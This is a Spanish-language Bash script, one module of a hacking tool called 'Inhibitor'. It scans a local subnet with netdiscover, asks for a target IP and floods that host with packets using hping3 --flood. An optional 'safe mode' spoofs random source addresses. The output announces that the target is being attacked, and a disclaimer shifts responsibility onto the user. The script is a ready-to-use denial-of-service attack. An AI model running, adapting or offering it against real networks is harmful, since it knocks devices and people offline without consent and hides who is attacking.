#!bin/bash

clear
echo
echo "                           _____           _       _   _       _   _                  "
echo "                          |_   _|         | |     (_) | |     (_) | |                 "
echo "                            | |    _ __   | |__    _  | |__    _  | |_    ___    _ __ "
echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  / _ \  | '__|"
echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
echo "                              __________________________________________________"					
echo "                                ︻デ═一  Created by: XDeadHackerX v1.0  ︻デ═一 " 
echo "          -------------------------------------------------------------------------------------------"
echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
echo "          -------------------------------------------------------------------------------------------"
echo
echo
echo "[4] Incomunicar a un Dispositivo/IP"
echo
read -p " Escribe la Ip de Red (192.168.1.0 o 192.168.0.0): " opc1
echo
sudo netdiscover -r $opc1/24 -P
echo
read -p "Pon la IP del Objetivo: " ip
read -p "Modo Seguro? (y/n): " opc2
echo
if [ $opc2 = y ]
	then
		clear
		echo
		echo "                           _____           _       _   _       _   _                  "
		echo "                          |_   _|         | |     (_) | |     (_) | |                 "
		echo "                            | |    _ __   | |__    _  | |__    _  | |_    ___    _ __ "
		echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  / _ \  | '__|"
		echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
		echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
		echo "                              __________________________________________________"					
		echo "                                ︻デ═一  Created by: XDeadHackerX v1.0  ︻デ═一 " 
		echo "          -------------------------------------------------------------------------------------------"
		echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
		echo "          -------------------------------------------------------------------------------------------"
		echo
		echo
		echo "[*] Pulse Ctrl + c (Finalizar Ataque)"
		echo
		echo "========================================================================================="
		echo "                      El Objetivo ($ip) esta siendo Atacado""                    |"
		echo "========================================================================================="
		echo
		sudo hping3 --rand-source -V $ip --flood
	else
		clear
		echo
		echo "                           _____           _       _   _       _   _                  "
		echo "                          |_   _|         | |     (_) | |     (_) | |                 "
		echo "                            | |    _ __   | |__    _  | |__    _  | |_    ___    _ __ "
		echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  / _ \  | '__|"
		echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
		echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
		echo "                              __________________________________________________"					
		echo "                                ︻デ═一  Created by: XDeadHackerX v1.0  ︻デ═一 " 
		echo "          -------------------------------------------------------------------------------------------"
		echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
		echo "          -------------------------------------------------------------------------------------------"
		echo
		echo
		echo "[*] Pulse Ctrl + c (Finalizar Ataque)"
		echo
		echo "========================================================================================="
		echo "                      El Objetivo ($ip) esta siendo Atacado""                    |"
		echo "========================================================================================="
		echo
		sudo hping3 -V $ip --flood
fi
sleep 1
echo
echo
echo "#####################"
echo "[1] Volver al Menu"
echo "[2] Volver a ejecutar"
echo "[3] Salir"
echo "#####################"
echo
read -p "Elige una opcion: " opc3
	case $opc3 in
			1 )	bash inhibitor.sh
				;;
			2 )	bash requisitos/4.sh
				;;
			3 )	exit && clear
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac

